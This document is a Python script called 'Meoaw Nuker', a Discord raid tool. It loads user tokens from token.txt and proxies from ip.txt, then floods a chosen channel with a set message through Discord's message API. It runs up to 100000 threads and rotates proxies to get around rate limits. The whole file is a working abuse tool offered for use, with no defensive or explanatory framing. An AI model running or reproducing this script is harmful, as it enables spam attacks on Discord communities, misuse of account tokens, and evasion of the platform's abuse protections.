import gotji
import os
import requests
import time
import random
from pystyle import *
from time import sleep
from concurrent.futures import ThreadPoolExecutor

meoaw_ui = """


░▒█▀▄▀█░▄▀▀▄░█▀▀▄░░▀░░█░░█▀▀░░░▒█▄░▒█░█░▒█░█░▄░█▀▀░█▀▀▄
░▒█▒█▒█░█░░█░█▀▀▄░░█▀░█░░█▀▀░░░▒█▒█▒█░█░▒█░█▀▄░█▀▀░█▄▄▀
░▒█░░▒█░░▀▀░░▀▀▀▀░▀▀▀░▀▀░▀▀▀░░░▒█░░▀█░░▀▀▀░▀░▀░▀▀▀░▀░▀▀


"""

function = """
[ 1 ] Fast Nuke

[ 2 ] Multi Nuker
"""

ui_choice = "Function > "

def main():

    os.system('cls')

    Anime.Fade(Center.Center(meoaw_ui),Colors.rainbow,Colorate.Vertical,enter=True)

    print(Colorate.Horizontal(Colors.purple_to_blue, function, 1))

    print(" ")

    print(" ")

    choice = input(Colorate.Horizontal(Colors.blue_to_purple, ui_choice, 1))

    print(" ")

    if choice == "1":
                    
        os.system('cls')

        print(" ")

        amount = int(input("Count > "))

        print(" ")

        os.system('cls')

        print(" ")

        Write.Print("Load Setup...", Colors.yellow_to_red, interval=0.04)

        print(" ")

        sleep(0)

        os.system('cls & title Meoaw Setup ( 4.1 )')

        print(" ")

        Write.Print("Start core !", Colors.cyan_to_green, interval=0.04)

        print(" ")

        sleep(0)

        os.system('cls')

        i = 0

        threading = ThreadPoolExecutor(max_workers=int(100000))

        while i < amount:

            i += 1

            threading.submit(attack)

        else:

            pass

    elif choice == "2":

        os.system('cls')

        print(" ")

        print("Use by 50 User to unlock this !")

        print(" ")

def attack():

    db = open("token.txt", "r").readlines()

    db_ip = open("ip.txt", "r").readlines()

    for token in db:

        ip = random.choice(db_ip)

        chid = gotji.main["chid"]

        msg = gotji.main["msg"]

        token_real = token.replace("\n", "")

        try:

            meoaw = requests.session()

            meoaw01 = meoaw.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'{token_real}'}, json={'content': f"{msg}"}, proxies={"http": ip, "https:": ip})

            if meoaw01.status_code == 200:

                print(" ")

                time_x = time.localtime()

                now = time.strftime("%B %d %Y %H:%M:%S", time_x)

                print(Colorate.Horizontal(Colors.rainbow, f"{now} | Status: Attack !", 1))

                print(" ")

            else:

                pass

        except:

            print(" ")

            print(Colorate.Horizontal(Colors.yellow_to_red, "[ Meoaw Nuke ] | Status: Rate ( By pass )", 1))

            print(" ")

main()